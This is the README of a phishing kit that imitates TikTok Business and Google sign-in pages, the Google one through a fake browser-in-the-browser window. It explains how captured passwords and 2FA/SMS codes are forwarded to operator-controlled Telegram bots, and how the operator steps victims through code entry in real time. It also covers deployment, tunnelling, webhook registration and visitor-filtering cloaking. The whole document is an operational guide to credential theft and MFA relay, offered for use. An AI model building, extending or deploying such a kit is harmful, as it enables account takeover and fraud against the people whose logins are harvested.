# tk-ap

A static frontend (`fe`), a PHP credential-collection app (`googlephish`), and a Node.js Express backend (`be`) for Telegram-gated approval.

**Email / phone + password (TikTok form)** — `POST` to `be`, poll until approved or rejected; optional 2FA round. No PHP involved.

**Log in with TikTok** — `POST` to `be` with `{ tiktok_login: true }`, bot sends a message; operator replies with a QR/image URL; client polls until `show_image` and displays the image in a modal.

**Sign in with Google** — a Browser-in-the-Browser (BITB) overlay loads `googlephish` in an iframe. The PHP flow sends captures to Telegram Bot B.

---

## Architecture

```
Browser (fe)
  │
  ├── POST /login (password) + poll ─────→ be (Node) ──→ Telegram Bot A
  │                                                           │
  ├── POST /login (tiktok_login:true) + poll ───────────────→│ (reply with image URL)
  │
  └── BITB overlay (iframe) ────────────→ googlephish (PHP)
                                              └── Telegram Bot B
```

Run **`be`** whenever you use the TikTok email/password or "Log in with TikTok" flows. **`googlephish`** is only required for the Google button (BITB).

- **`fe/`** — Plain HTML/CSS/JS. No build step. Served statically.
- **`googlephish/`** — PHP pages cloning Google sign-in UI. Captures email, password, and OTP/SMS codes and pushes them to Telegram Bot B. The operator drives the victim step-by-step via Telegram inline buttons.
- **`be/`** — Express API. Receives TikTok-style login submissions, holds them as `pending`, and sends Telegram messages with Approve / Reject / 2FA inline keyboard buttons (Bot A).

---

## Prerequisites

| Tool | Min version |
|------|-------------|
| PHP | 8.0+ (local dev) |
| Docker | any recent (PHP container) |
| Node.js | 18+ (only if running `be`) |
| npm / yarn | any modern (only if running `be`) |

---

## Quick Start

### 1 — Clone

```bash
git clone <repo-url> tk-ap
cd tk-ap
```

### 2 — Configure the PHP app

Edit `googlephish/config.json`:

```json
{
    "afk_mode": false,
    "afk_interval": 5000,
    "telegram_token": "<Bot-B token from @BotFather>",
    "telegram_chat_id": "<your numeric chat/group ID>",
    "website_url": "https://your-phphost.example.com",
    "telegram_buttons": true
}
```

> `website_url` must be the **public HTTPS URL** where `googlephish` is reachable. The PHP app calls `setWebhook` automatically on every page load using `<website_url>/telegram_api.php`. For local dev, use an ngrok/cloudflared tunnel.

Also fill in the moonito.net traffic-filter keys in `googlephish/lib/config.php`:

```php
$apiPublicKey = '<your moonito public key>';
$apiSecretKey = '<your moonito secret key>';
```

Get keys at [https://moonito.net/api](https://moonito.net/api). Set `$isProtected = false` to skip filtering during development.

### 3 — Configure the frontend

Edit `fe/config.js`:

```js
window.APP_CONFIG = {
    apiBaseUrl: 'http://localhost:4000',
    authPollIntervalMs: 1500,
    authPollMaxMs: 3 * 60 * 1000,

    afterLoginRedirectUrl: 'https://www.google.com',
    afterLoginRedirectDelayMs: 0,

    googlephishBaseUrl: 'http://localhost:8080',

    bitbEntryPath: '/index.php',
    bitbDisplayUrl: 'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin',
    bitbTabTitle:   'Sign in - Google Accounts',
    bitbFaviconUrl: 'https://www.google.com/favicon.ico',
    bitbLabLabel: ''
};
```

- **`apiBaseUrl`** — Node `be` origin (no trailing slash). Used for **Log in** (email/phone + password) and **Log in with TikTok**.
- **`googlephishBaseUrl`** — PHP app origin. Used only for **Sign in with Google** (BITB iframe). There is no Google SDK or OAuth client ID in the frontend.

### 4 — Configure the Node backend

Required for the TikTok **Log in** (password) and **Log in with TikTok** flows.

```bash
cp be/.env.example be/.env
```

Edit `be/.env`:

```env
PORT=4000

TELEGRAM_BOT_TOKEN=<Bot-A token from @BotFather>
TELEGRAM_ADMIN_CHAT_ID=<your numeric chat/group ID>

# Recommended — must match the secret_token you pass to setWebhook
TELEGRAM_WEBHOOK_SECRET=<random string>

# Informational only — not read by the app; useful when running setWebhook manually
PUBLIC_BASE_URL=https://your-be-host.example.com
```

**⚠️ IMPORTANT:** After deployment, you **MUST** register Bot A's webhook for the app to function — see [Setting the Telegram Webhook (Bot A)](#️-mandatory-setting-the-telegram-webhook-bot-a) below.

---

## Running locally

### PHP app (`googlephish`) — Docker (recommended)

```bash
cd googlephish
docker build -t googlephish .
docker run --rm -p 8080:80 googlephish
```

App is at `http://localhost:8080`.

> **Webhook note:** `website_url` in `config.json` must be a public HTTPS URL for Telegram webhooks to work. Use a tunnel:
> ```bash
> ngrok http 8080
> # or
> cloudflared tunnel --url http://localhost:8080
> ```
> Update `website_url` to the tunnel URL before starting the PHP server.

### PHP app — plain PHP built-in server

```bash
cd googlephish
php -S 127.0.0.1:8080
```

### Frontend (`fe`)

```bash
# Python
python3 -m http.server 3000 --directory fe

# npx serve
npx serve fe -l 3000
```

Open `http://localhost:3000`. **Log in** talks to `apiBaseUrl` (`be`). **Sign in with Google** opens BITB using `googlephishBaseUrl`.

### Node backend (`be`)

```bash
cd be
yarn install
yarn dev    # nodemon, auto-restart
# or
yarn start  # production
```

Server starts on `http://localhost:4000`.

---

## ⚠️ **MANDATORY**: Setting the Telegram Webhook (Bot A)

**This step is required for the app to work.** Bot A is the Node backend webhook for Telegram inline-button presses (approve / reject / 2FA) and TikTok image URL replies. Without setting the webhook, Telegram cannot send updates to your backend.

### Step 1 — Expose the backend

For local dev, use a tunnel:

```bash
ngrok http 4000
# → https://abc123.ngrok.io
```

For production (Render, Fly.io, etc.) use your public URL.

### Step 2 — Register the webhook (REQUIRED)

**POST method (recommended):**

```bash
curl -sS -X POST "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/setWebhook" \
  -H "Content-Type: application/json" \
  -d '{"url":"<BASE_URL>/telegram/webhook","secret_token":"<TELEGRAM_WEBHOOK_SECRET>"}'
```

**GET method (alternative):**

```bash
curl -sS -G "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/setWebhook" \
  --data-urlencode "url=<BASE_URL>/telegram/webhook" \
  --data-urlencode "secret_token=<TELEGRAM_WEBHOOK_SECRET>"
```

**Replace placeholders:**
- `<TELEGRAM_BOT_TOKEN>` — Bot A token from @BotFather
- `<BASE_URL>` — Your public base URL (e.g., `https://abc123.ngrok.io` or `https://your-app.render.com`)
- `<TELEGRAM_WEBHOOK_SECRET>` — Must exactly match `TELEGRAM_WEBHOOK_SECRET` in `be/.env`

**Example with real values:**

```bash
curl -sS -X POST "https://api.telegram.org/bot123456:ABC-DEF/setWebhook" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://abc123.ngrok.io/telegram/webhook","secret_token":"my-webhook-secret"}'
```

**Requirements:**
- `url` must be HTTPS and publicly reachable
- `secret_token` must exactly match `TELEGRAM_WEBHOOK_SECRET` in `be/.env`. If you leave `TELEGRAM_WEBHOOK_SECRET` empty, omit the `secret_token` field entirely (not recommended for security)

### Step 3 — Verify

```bash
curl "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/getWebhookInfo"
```

Look for `"url": "https://..."` and `"pending_update_count": 0`.

### Removing the webhook

```bash
curl "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/deleteWebhook"
```

---

## Setting the Telegram Webhook (Bot B — PHP)

Bot B is auto-configured. The PHP app calls `setWebhook` pointing at `<website_url>/telegram_api.php` on **every page load** — no manual step needed. Just make sure `website_url` in `googlephish/config.json` is a public HTTPS URL before the PHP app is started.

---

## Login Flows

### Password login flow

1. User submits email/phone + password in the TikTok form.
2. `fe` → `POST /login` with `{ username, password }`.
3. `be` creates a pending request (UUID), sends a Telegram message to Bot A with inline buttons: **Approve**, **Reject**, **2FA Email**, **2FA Phone**, **2FA App**.
4. `fe` polls `GET /login-status?request_id=<id>` every `authPollIntervalMs` ms for up to `authPollMaxMs` ms.
5. Operator presses a button. Telegram sends a callback to `POST /telegram/webhook`.
   - **Approve** → status becomes `approved` → `fe` redirects to `afterLoginRedirectUrl`.
   - **Reject** → status becomes `rejected` → `fe` shows error banner.
   - **2FA** → status becomes `2fa` with `two_fa_type` (`email` / `phone` / `totp`) → `fe` shows 2FA input.
6. *If 2FA:* User enters code → `fe` → `POST /submit-2fa` → `be` forwards code to Telegram with new Approve / Reject buttons → operator approves/rejects → `fe` continues polling.

Request TTL is **2 minutes**. Expired requests return `rejected` on the next poll.

### TikTok QR login flow

1. User clicks **Log in with TikTok**.
2. `fe` → `POST /login` with `{ tiktok_login: true }` (or `POST /tiktok-login`).
3. `be` creates a pending request, sends a Telegram message (Bot A) instructing the operator to reply with an image URL.
4. `fe` polls `GET /login-status`.
5. Operator replies to the bot message with the image URL in one of these formats:
   ```
   image_url: https://example.com/qr.png
   ```
   or just the bare URL on a single line:
   ```
   https://example.com/qr.png
   ```
6. Webhook handler updates the request status to `show_image` and stores the URL.
7. Next poll returns `{ status: "show_image", image_url: "..." }` → `fe` shows the QR image modal.

### Google BITB flow

1. User clicks **Sign in with Google**.
2. `fe` opens a Browser-in-the-Browser overlay (fake Chrome window) containing an iframe loaded from `googlephishBaseUrl`.
3. PHP multi-step Google sign-in clone collects email → password → 2FA/SMS.
4. Each step POSTs to `process.php`, which forwards captured data to Telegram Bot B with step navigation buttons.
5. The `be` Node backend is **not involved** in this path.

---

## Configuration Reference

### `fe/config.js`

| Key | Required | Description |
|-----|----------|-------------|
| `apiBaseUrl` | For password / TikTok login | Node `be` origin, no trailing slash (`POST /login`, poll `/login-status`) |
| `authPollIntervalMs` | No | Milliseconds between status polls (default `1500`) |
| `authPollMaxMs` | No | Max time to poll before timeout (default `3` minutes) |
| `googlephishBaseUrl` | For Google button | Public URL of the PHP app (no trailing slash); BITB iframe only |
| `bitbEntryPath` | No | First PHP page in the BITB iframe (default `/index.php`) |
| `bitbDisplayUrl` | No | URL shown in the fake Chrome address bar |
| `bitbTabTitle` | No | Text of the fake Chrome tab |
| `bitbFaviconUrl` | No | Favicon in the fake Chrome tab |
| `bitbLabLabel` | No | Optional banner in the fake title bar; empty string hides it |
| `afterLoginRedirectUrl` | No | Browser redirect after Telegram **approval** on password flow |
| `afterLoginRedirectDelayMs` | No | Delay before redirect in ms (default `0`) |

### `googlephish/config.json`

| Key | Required | Description |
|-----|----------|-------------|
| `telegram_token` | **Yes** | Bot B token from @BotFather |
| `telegram_chat_id` | **Yes** | Operator chat/group ID for Bot B messages |
| `website_url` | **Yes** | Public HTTPS base URL of the PHP app; used for `setWebhook` |
| `telegram_buttons` | No | Show inline keyboard buttons in Telegram (default `true`) |
| `afk_mode` | No | Pause operator-driven page transitions (default `false`) |
| `afk_interval` | No | Browser polling interval in ms (default `5000`) |

### `googlephish/lib/config.php`

| Variable | Required | Description |
|----------|----------|-------------|
| `$apiPublicKey` | No | moonito.net public key for traffic filtering |
| `$apiSecretKey` | No | moonito.net secret key |
| `$isProtected` | No | Enable/disable visitor filtering (set `false` for local dev) |
| `$unwantedVisitorTo` | No | Redirect/iframe target for filtered-out visitors |
| `$unwantedVisitorAction` | No | `1` = redirect, `2` = iframe, `3` = load remote content |

### `be/.env`

| Variable | Required | Description |
|----------|----------|-------------|
| `PORT` | No | HTTP port (default `4000`) |
| `TELEGRAM_BOT_TOKEN` | **Yes** | Bot A token from @BotFather |
| `TELEGRAM_ADMIN_CHAT_ID` | **Yes** | Numeric chat/group ID for Bot A approval messages |
| `TELEGRAM_WEBHOOK_SECRET` | No | Secret token for webhook validation (recommended) |
| `PUBLIC_BASE_URL` | No | Informational note only — not read by the app |

---

## Node Backend API Reference

### `POST /login`

Submit a login request. Returns `202` with `{ status: "pending", request_id }`.

**Password login:**
```json
{ "username": "user@example.com", "password": "secret" }
```

**TikTok QR login:**
```json
{ "tiktok_login": true }
```

**Google token (direct):**
```json
{ "credential": "<Google ID token>" }
```

---

### `GET /login-status?request_id=<id>`

Poll the status of a login request.

| Status | Meaning | Extra fields |
|--------|---------|--------------|
| `pending` | Awaiting operator action | — |
| `approved` | Operator approved | — |
| `rejected` | Operator rejected or expired | — |
| `2fa` | Operator requested a 2FA code | `two_fa_type` (`email`/`phone`/`totp`), `request_id` |
| `show_image` | Operator provided a TikTok QR image URL | `image_url` |

Returns `404` if the request is unknown or has expired (TTL: 2 minutes).

---

### `POST /submit-2fa`

Submit a 2FA code after receiving `status: "2fa"`.

```json
{ "request_id": "<id>", "code": "123456" }
```

Returns `202 { status: "pending", request_id }`. The code is forwarded to Telegram; continue polling `/login-status`.

---

### `POST /tiktok-login`

Alias for `POST /login` with `{ tiktok_login: true }`. Same response.

---

### `POST /telegram/webhook`

Telegram Bot A webhook receiver. Called by Telegram, not the browser. Validates `X-Telegram-Bot-Api-Secret-Token` against `TELEGRAM_WEBHOOK_SECRET` if set.

Handles:
- Inline button callbacks: `approve:<id>`, `reject:<id>`, `2fa_email:<id>`, `2fa_phone:<id>`, `2fa_totp:<id>`
- Text replies to bot messages containing a TikTok image URL

---

### `GET /health`

Returns `{ ok: true }`. Used as a liveness probe.

---

## Deployment

### googlephish (PHP)

Deploy as a Docker container to any service that supports it (Render Web Service with Docker runtime, Fly.io, Railway, etc.):

```bash
cd googlephish
docker build -t googlephish .
```

Before building, set `website_url` in `config.json` to the final public URL of the service.

### fe (frontend)

Serve the `fe/` directory from any static host (Render Static Site, Netlify, Cloudflare Pages, Nginx, etc.). Before deploying, update `fe/config.js`:
- Set `apiBaseUrl` to your deployed Node `be` service URL.
- Set `googlephishBaseUrl` to your deployed PHP service URL.

Each service can run on a different host/domain.

### be (Node backend)

Deploy as a Node 18+ web service. Set all `be/.env` variables in your hosting dashboard. After deploying, run the `setWebhook` curl command once to register Bot A's webhook URL.

---

## Project Structure

```
tk-ap/
├── be/                          # Node.js Express API (TikTok password + TikTok QR + Telegram Bot A)
│   ├── .env.example
│   ├── package.json
│   ├── server.js
│   └── src/
│       ├── app.js               # Express app factory (cors, json, route mounts)
│       ├── config.js            # Env → constants (PORT, TELEGRAM_BOT_TOKEN, etc.)
│       ├── lib/
│       │   ├── clientIp.js      # X-Forwarded-For / socket IP extraction
│       │   ├── store.js         # In-memory request store (TTL 2 min)
│       │   └── telegram.js      # Telegram API wrapper + message builders
│       └── routes/
│           ├── health.js        # GET /health
│           ├── login.js         # POST /login, GET /login-status, POST /submit-2fa, POST /tiktok-login
│           └── telegram.js      # POST /telegram/webhook (Bot A callback + TikTok image reply)
├── fe/                          # Static frontend (no build step)
│   ├── config.js                # Runtime config: apiBaseUrl, googlephishBaseUrl, BITB settings
│   ├── index.html               # TikTok Business–style login page with BITB overlay
│   ├── main.js                  # App wiring: form submit, polling, BITB open, 2FA, countdowns
│   ├── style.css                # Full layout: form, auth banner, loader, 2FA, BITB chrome, modal
│   └── js/
│       ├── auth-api.js          # HTTP client for be (login, poll, 2FA submit)
│       ├── auth-ui.js           # UI state: loader, banners, 2FA view, TikTok image modal, redirect
│       └── bitb-googlephish.js  # BITB overlay: fake Chrome window + iframe (Google button only)
└── googlephish/                 # PHP Google sign-in clone
    ├── Dockerfile               # php:8.2-apache, enables rewrite + headers modules
    ├── config.json              # Bot B token + operator chat ID + website_url
    ├── include.php              # Session bootstrap, setWebhook, Telegram helpers
    ├── telegram_api.php         # PHP Telegram webhook: callback routing + per-IP instruction files
    ├── process.php              # POST handler / step router (email→password→2fa→sms)
    ├── index.php                # Email step (Google sign-in clone)
    ├── password.php             # Password step
    ├── 2-step.php               # TOTP/authenticator step
    ├── sms.php                  # SMS recovery step
    ├── loading.php              # Loading interstitial shown between steps
    ├── tap.php / tap2.php       # Device/number challenge pages (driven by Telegram replies)
    ├── complete.php             # Final step → redirect via nullreferer.php
    ├── nullreferer.php          # Sets Referrer-Policy: no-referrer then redirects to ?link=
    └── lib/
        ├── config.php           # moonito.net API keys + visitor filter settings
        └── detector.php         # Optional visitor filtering via moonito.net analytics API
```
